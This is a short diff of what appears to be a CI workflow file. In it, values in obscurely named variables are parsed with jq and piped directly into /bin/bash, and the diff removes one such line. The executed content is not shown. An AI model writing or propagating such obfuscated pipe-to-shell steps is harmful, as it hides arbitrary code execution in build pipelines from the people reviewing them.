@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$g5365" | jq -r .gqmxk5 | /bin/bash
           printf '%s' "$tx1" | jq -r .qkftj38197 | /bin/bash
-          printf '%s' "$xch6407" | jq -r .y1919 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
